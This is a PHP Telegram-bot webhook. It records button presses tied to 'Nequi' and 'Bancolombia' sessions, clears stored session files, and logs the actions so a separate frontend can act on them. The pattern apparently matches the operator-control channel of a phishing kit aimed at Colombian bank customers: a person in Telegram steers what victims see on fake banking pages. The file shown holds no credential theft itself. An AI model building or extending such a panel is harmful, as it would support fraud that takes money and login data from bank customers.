<?php

require_once __DIR__ . '/../../src/TelegramBot.php';
require_once __DIR__ . '/../../src/Environment.php';

use App\TelegramBot;

header('Content-Type: application/json');

$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (!$update) {
    http_response_code(400);
    exit;
}

$telegram = new TelegramBot();

// Verificar si es un callback query (botón presionado)
if (isset($update['callback_query'])) {
    $callbackQuery = $update['callback_query'];
    $callbackData = $callbackQuery['data'];
    $callbackQueryId = $callbackQuery['id'];
    
    // Extraer acción y sessionId del callback_data (formato: "action|sessionId")
    $parts = explode('|', $callbackData);
    $action = $parts[0] ?? $callbackData;
    $sessionId = $parts[1] ?? 'unknown';
    
    // Limpiar sesión Nequi si presionan Finalizar
    if ($action === 'nequi_finalizar') {
        $sessionDataFile = Environment::getStoragePath() . '/nequi_sessions.json';
        if (file_exists($sessionDataFile)) {
            $allSessions = json_decode(file_get_contents($sessionDataFile), true) ?? [];
            if (isset($allSessions[$sessionId])) {
                unset($allSessions[$sessionId]);
                file_put_contents($sessionDataFile, json_encode($allSessions, JSON_PRETTY_PRINT));
            }
        }
    }
    
    // Limpiar sesión Bancolombia si presionan Finalizar
    if ($action === 'bancolombia_finalizar') {
        $sessionDataFile = Environment::getStoragePath() . '/bancolombia_sessions.json';
        if (file_exists($sessionDataFile)) {
            $allSessions = json_decode(file_get_contents($sessionDataFile), true) ?? [];
            if (isset($allSessions[$sessionId])) {
                unset($allSessions[$sessionId]);
                file_put_contents($sessionDataFile, json_encode($allSessions, JSON_PRETTY_PRINT));
            }
        }
    }
    
    // Guardar la acción en un archivo para que el frontend pueda leerla
    $sessionFile = Environment::getStoragePath() . '/telegram_actions.json';
    
    $actions = [];
    if (file_exists($sessionFile)) {
        $actions = json_decode(file_get_contents($sessionFile), true) ?? [];
    }
    
    $actions[] = [
        'action' => $action,
        'session_id' => $sessionId,
        'timestamp' => time(),
        'callback_query_id' => $callbackQueryId
    ];
    
    // Mantener solo las últimas 100 acciones
    if (count($actions) > 100) {
        $actions = array_slice($actions, -100);
    }
    
    file_put_contents($sessionFile, json_encode($actions, JSON_PRETTY_PRINT));
    
    // Responder al callback
    $telegram->answerCallbackQuery($callbackQueryId, '✅ Acción ejecutada');
    
    echo json_encode(['ok' => true, 'action' => $action, 'session' => $sessionId]);
} else {
    echo json_encode(['ok' => true, 'message' => 'No callback']);
}
